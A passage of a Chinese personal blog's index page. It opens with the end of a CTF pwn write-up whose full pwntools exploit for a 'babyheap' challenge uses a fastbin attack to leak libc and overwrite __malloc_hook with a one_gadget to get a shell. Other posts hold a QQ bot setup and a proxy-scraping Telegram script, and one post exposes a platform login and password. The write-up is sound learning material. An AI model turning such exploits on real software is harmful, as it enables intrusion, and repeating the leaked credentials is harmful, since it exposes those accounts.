<li>细节点2：要绕过fastbin的长度检测，所以要多次溢出修改size，这里我建议不要急着free，我自己做的时候先free就出错了</li>
<li>细节点3： idx问题， 要注意标记好idx，不然自己都不知道哪个对应哪个</li>
<li>具体在exp里在标注下注释就好了</li>
</ol>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'babyheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'babyheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>)</span><br><span class="line">    Dump(<span class="number">0</span>)</span><br><span class="line">    Fill(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#test()</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">    Allocate(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#细节点1</span></span><br><span class="line">    Free(<span class="number">2</span>)</span><br><span class="line">    Free(<span class="number">1</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">    Fill(<span class="number">0</span>, len(payload), payload)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    <span class="comment">#细节点2</span></span><br><span class="line">    Fill(<span class="number">3</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">    <span class="comment">#细节点2</span></span><br><span class="line">    Fill(<span class="number">3</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">    Free(<span class="number">4</span>) </span><br><span class="line">    Dump(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    io.success(<span class="string">"malloc_hook: 0x%x"</span> %malloc_hook)</span><br><span class="line">    one_gadget = <span class="number">0x45216</span> </span><br><span class="line">    one_gadget = <span class="number">0x4526a</span> <span class="comment">#0xf02a4 0xf1147</span></span><br><span class="line">    one_gadget = one_gadget + libc_base </span><br><span class="line">    ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    Free(<span class="number">4</span>)</span><br><span class="line">    payload = p64(ptr)</span><br><span class="line">    Fill(<span class="number">2</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#6</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">    Fill(<span class="number">6</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x20</span>) <span class="comment">#7</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>fastbin的题目相对来说不难，可能是因为前面有基础了的原因了吧，以后多做下题巩固下就好</li>
<li>double free也是常用的攻击手段</li>
<li>逆向还得多学习，像搜索引擎那题，看都看不懂题目，做什么题。。。</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/" target="_blank" rel="noopener">ctf-wiki</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/other/robot/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/other/robot/" itemprop="url">other/robot</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:22+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><p>docker run -ti -d –name cqhttp-test -v $(pwd)/coolq:/home/user/coolq -p 9000:9000  -p 5700:5700  -e COOLQ_ACCOUNT=2505785013 -e CQHTTP_POST_URL=<a href="http://172.16.62.3:8080" target="_blank" rel="noopener">http://172.16.62.3:8080</a> -e CQHTTP_SERVE_DATA_FILES=yes richardchien/cqhttp:latest</p>
<h1 id="测试群号"><a href="#测试群号" class="headerlink" title="测试群号"></a>测试群号</h1><p>893640697</p>
<h1 id="测试qq"><a href="#测试qq" class="headerlink" title="测试qq"></a>测试qq</h1><p>3055994971<br>2505785013</p>
<h1 id="数据对比"><a href="#数据对比" class="headerlink" title="数据对比"></a>数据对比</h1><p>私聊消息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'message_id'</span>: <span class="number">34</span>, <span class="string">'self_id'</span>: <span class="number">2505785013</span>, <span class="string">'user_id'</span>: <span class="number">3055994971</span>, <span class="string">'message'</span>: <span class="string">'1'</span>, <span class="string">'post_type'</span>: <span class="string">'message'</span>, <span class="string">'font'</span>: <span class="number">1361288</span>, <span class="string">'raw_message'</span>: <span class="string">'1'</span>, <span class="string">'sender'</span>: &#123;<span class="string">'age'</span>: <span class="number">22</span>, <span class="string">'sex'</span>: <span class="string">'female'</span>, <span class="string">'user_id'</span>: <span class="number">3055994971</span>, <span class="string">'nickname'</span>: <span class="string">'小'</span>&#125;, <span class="string">'time'</span>: <span class="number">1562036306</span>, <span class="string">'message_type'</span>: <span class="string">'private'</span>, <span class="string">'sub_type'</span>: <span class="string">'friend'</span>&#125;</span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> - - [<span class="number">02</span>/Jul/<span class="number">2019</span> <span class="number">10</span>:<span class="number">58</span>:<span class="number">26</span>] <span class="string">"POST / HTTP/1.1"</span> <span class="number">200</span> -</span><br></pre></td></tr></table></figure>
<p>群组消息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'message_id'</span>: <span class="number">37</span>, <span class="string">'message'</span>: <span class="string">'1'</span>, <span class="string">'group_id'</span>: <span class="number">893640697</span>, <span class="string">'post_type'</span>: <span class="string">'message'</span>, <span class="string">'sender'</span>: &#123;<span class="string">'role'</span>: <span class="string">'owner'</span>, <span class="string">'area'</span>: <span class="string">'阿尔巴尼亚'</span>, <span class="string">'title'</span>: <span class="string">''</span>, <span class="string">'user_id'</span>: <span class="number">3055994971</span>, <span class="string">'nickname'</span>: <span class="string">'小'</span>, <span class="string">'card'</span>: <span class="string">''</span>, <span class="string">'level'</span>: <span class="string">'潜水'</span>, <span class="string">'age'</span>: <span class="number">22</span>, <span class="string">'sex'</span>: <span class="string">'female'</span>&#125;, <span class="string">'message_type'</span>: <span class="string">'group'</span>, <span class="string">'font'</span>: <span class="number">1359280</span>, <span class="string">'user_id'</span>: <span class="number">3055994971</span>, <span class="string">'self_id'</span>: <span class="number">2505785013</span>, <span class="string">'raw_message'</span>: <span class="string">'1'</span>, <span class="string">'time'</span>: <span class="number">1562036312</span>, <span class="string">'sub_type'</span>: <span class="string">'normal'</span>, <span class="string">'anonymous'</span>: <span class="literal">None</span>&#125;</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/other/bisai/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/other/bisai/" itemprop="url">other/bisai</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:22+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>答题平台：<br><a href="https://172.20.1.1" target="_blank" rel="noopener">https://172.20.1.1</a><br>student63   R*7wGEK5<br>ftp:<br>172.20.1.28<br>7wGEK5</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/other/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/other/hello-world/" itemprop="url">Hello World</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:22+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="My-home"><a href="#My-home" class="headerlink" title="My home"></a><a href="https://qq1270287245.github.io/" target="_blank" rel="noopener">My home</a></h2><h1 id="Welcome-to-here"><a href="#Welcome-to-here" class="headerlink" title="Welcome to here!"></a>Welcome to here!</h1><p>This is my first home.If you get any problems,you can find me or just leave a message.</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/linux/v2ray-change/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/linux/v2ray-change/" itemprop="url">linux/v2ray-change</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:10:04+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="功能构思"><a href="#功能构思" class="headerlink" title="功能构思"></a>功能构思</h1><ol>
<li>修改监听端口</li>
<li>导入vmess</li>
<li>指定配置文件替换</li>
<li>界面输入配置进行更换</li>
<li>多账号切换</li>
<li>订阅更新</li>
<li>修改配置</li>
</ol>
<p>初步想法，做好后利用docker挂载/etc/v2ray目录，通过docker修改配置文件</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/linux/hexoDeploy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/linux/hexoDeploy/" itemprop="url">linux/hexoDeploy</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:10:04+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/linux/botsave/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/linux/botsave/" itemprop="url">linux/botsave</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:10:04+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>‘’’<br>def init(group_id):<br>    reply_result=[]<br>    #此处的some_name是一个随便起的名称，第一次运行会让你输入手机号和验证码，之后会生成一个some_name.session的文件，再次运行的时候就不需要反复输入手机号验证码了<br>    client.send_message(<br>        group_id,<br>        ‘/start@free2ss_bot’<br>    )<br>    time.sleep(3)<br>    result = client.get_messages(GROUP_ID)<br>    for i in result[0].reply_markup.rows:<br>        for j in i.buttons:<br>            reply_result.append(j.text)<br>    dict={}<br>    import re<br>    re_words = re.compile(u”[\u4e00-\u9fa5]+”)<br>    for place in reply_result:<br>        dict[re_words.findall(place)[0]]=place<br>    return dict</p>
<p>def ssr2html(body):<br>    message = “””<!DOCTYPE html></p>
<html>
<head>
<meta charset="UTF-8">
<title></title>
</head>
<body>
%s 
</body>
</html>
"""%(body)
    with open ('/var/www/html/ssr.html', 'w', encoding='utf-8') as f:
        f.write(message)

<p>place = init(GROUP_ID)<br>print(place)<br>get_place=’’</p>
<p>@client.on(events.NewMessage(pattern=’ssr [\u4e00-\u9fa5]+’))<br>async def my_event_handler(event):<br>    global get_place<br>    get_place = event.raw_text.split(‘ ‘)[1]<br>    await client.send_message(<br>        GROUP_ID,<br>        ‘/start@free2ss_bot’<br>    )</p>
<p>@client.on(events.NewMessage(pattern=’选择节点所属区域’))<br>async def my_event_handler(event):<br>    global get_place<br>    try:<br>        result = place[get_place]<br>    except Exception as e:#出现异常默认为香港<br>        result = place[‘香港’]<br>        await client.send_message(<br>            GROUP_ID,<br>            ‘不在地区范围内,默认选择香港地区，地区列表如下\n’<br>        )<br>        await client.send_message(<br>            GROUP_ID,<br>            str(place.keys())[11:-2]<br>        )<br>    get_place=result<br>    await event.reply(result)</p>
<p>@client.on(events.NewMessage(pattern=’最新可用节点’))<br>async def my_event_handler(event):<br>    print(event.raw_text)<br>    ssr2html(event.raw_text)</p>
<p>‘’’</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/">&lt;i class=&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/5/">&lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">LiHua</p>
              <p class="site-description motion-element" itemprop="description">One people that no one know</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">62</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">LiHua</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
